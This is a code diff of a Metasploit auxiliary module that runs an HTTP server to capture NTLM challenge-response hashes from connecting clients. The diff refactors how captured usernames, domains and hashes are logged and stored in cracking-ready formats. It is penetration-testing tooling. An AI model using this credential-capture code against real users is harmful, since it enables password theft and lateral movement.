@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 require 'rex/proto/ntlm/constants'
 require 'rex/proto/ntlm/message'
@@ -13,8 +11,7 @@ NTLM_CONST = Rex::Proto::NTLM::Constants
 NTLM_CRYPT = Rex::Proto::NTLM::Crypt
 MESSAGE = Rex::Proto::NTLM::Message
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
@@ -45,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
       OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
 
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptString.new('DOMAIN',  [ false, "The default domain to use for NTLM authentication", "DOMAIN"]),
@@ -53,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('DNSNAME',  [ false, "The default DNS server name to use for NTLM authentication", "SERVER"]),
       OptString.new('DNSDOMAIN',  [ false, "The default DNS domain name to use for NTLM authentication", "example.com"]),
       OptBool.new('FORCEDEFAULT',  [ false, "Force the default settings", false])
-    ], self.class)
+    ])
 
   end
 
@@ -118,7 +115,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def handle_auth(cli,hash)
-    #authorization string is base64 encoded message
+    # authorization string is base64 encoded message
     message = Rex::Text.decode_base64(hash)
 
     if(message[8,1] == "\x01")
@@ -142,7 +139,7 @@ class Metasploit3 < Msf::Auxiliary
       response.headers['WWW-Authenticate'] = "NTLM " + chalhash
       return response
 
-    #if the message is a type 3 message, then we have our creds
+    # if the message is a type 3 message, then we have our creds
     elsif(message[8,1] == "\x03")
       domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
       nt_len = ntlm_hash.length
@@ -156,7 +153,7 @@ class Metasploit3 < Msf::Auxiliary
         if arg[:lm_hash][16,32] == '0' * 32
           arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
         end
-      #if the length of the ntlm response is not 24 then it will be bigger and represent
+      # if the length of the ntlm response is not 24 then it will be bigger and represent
       # a ntlmv2 response
       elsif nt_len > 48 #lmv2/ntlmv2
         arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
@@ -293,13 +290,11 @@ class Metasploit3 < Msf::Auxiliary
       capturedtime = Time.now.to_s
       case ntlm_ver
       when NTLM_CONST::NTLM_V1_RESPONSE
-        smb_db_type_hash = "smb_netv1_hash"
         capturelogmessage =
           "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
           "DOMAIN: #{domain} USER: #{user} \n" +
           "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
       when NTLM_CONST::NTLM_V2_RESPONSE
-        smb_db_type_hash = "smb_netv2_hash"
         capturelogmessage =
           "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
           "DOMAIN: #{domain} USER: #{user} \n" +
@@ -308,9 +303,8 @@ class Metasploit3 < Msf::Auxiliary
           "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
           "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
-        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
-        smb_db_type_hash = "smb_netv1_hash"
+        # we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+        # also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
         capturelogmessage =
           "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
           "DOMAIN: #{domain} USER: #{user} \n" +
@@ -324,22 +318,21 @@ class Metasploit3 < Msf::Auxiliary
       print_status(capturelogmessage)
 
       # DB reporting
-      # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
+      # Rem : one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
-      report_auth_info(
-        :host  => ip,
-        :port => 445,
-        :sname => 'smb_challenge',
-        :user => user,
-        :pass => domain + ":" +
-          ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
-          ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
-          datastore['CHALLENGE'].to_s,
-        :type => smb_db_type_hash,
-        :proof => "DOMAIN=#{domain}",
-        :source_type => "captured",
-        :active => true
-      )
+      opts_report = {
+        ip: ip,
+        user: user,
+        domain: domain,
+        ntlm_ver: ntlm_ver,
+        lm_hash: lm_hash,
+        nt_hash: nt_hash
+      }
+      opts_report.merge!(lm_cli_challenge: lm_cli_challenge) if lm_cli_challenge
+      opts_report.merge!(nt_cli_challenge: nt_cli_challenge) if nt_cli_challenge
+
+      report_creds(opts_report)
+
       #if(datastore['LOGFILE'])
       #  File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
       #end
@@ -405,5 +398,82 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
   end
+
+  def report_creds(opts)
+    ip = opts[:ip] || rhost
+    user = opts[:user] || nil
+    domain = opts[:domain] || nil
+    ntlm_ver = opts[:ntlm_ver] || nil
+    lm_hash = opts[:lm_hash] || nil
+    nt_hash = opts[:nt_hash] || nil
+    lm_cli_challenge = opts[:lm_cli_challenge] || nil
+    nt_cli_challenge = opts[:nt_cli_challenge] || nil
+
+    case ntlm_ver
+    when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE
+      hash = [
+        user, '',
+        domain ? domain : 'NULL',
+        lm_hash ? lm_hash : '0' * 48,
+        nt_hash ? nt_hash : '0' * 48,
+        @challenge.unpack('H*')[0]
+      ].join(':').gsub(/\n/, '\\n')
+      report_hash(ip, user, 'netntlm', hash)
+    when NTLM_CONST::NTLM_V2_RESPONSE
+      hash = [
+        user, '',
+        domain ? domain : 'NULL',
+        @challenge.unpack('H*')[0],
+        lm_hash ? lm_hash : '0' * 32,
+        lm_cli_challenge ? lm_cli_challenge : '0' * 16
+      ].join(':').gsub(/\n/, '\\n')
+      report_hash(ip, user, 'netlmv2', hash)
+
+      hash = [
+        user, '',
+        domain ? domain : 'NULL',
+        @challenge.unpack('H*')[0],
+        nt_hash ? nt_hash : '0' * 32,
+        nt_cli_challenge ? nt_cli_challenge : '0' * 160
+      ].join(':').gsub(/\n/, '\\n')
+      report_hash(ip, user, 'netntlmv2', hash)
+    else
+      hash = domain + ':' +
+        ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : '00' * 24 ) + ':' +
+        ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  '00' * 24 ) + ':' +
+        datastore['CHALLENGE'].to_s
+      report_hash(ip, user, nil, hash)
+    end
+  end
+
+  def report_hash(ip, user, type_hash, hash)
+    service_data = {
+      address: ip,
+      port: 445,
+      service_name: 'smb',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      username: user
+    }.merge(service_data)
+
+    unless type_hash.nil?
+      credential_data.merge!(jtr_format: type_hash)
+    end
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
 
 end
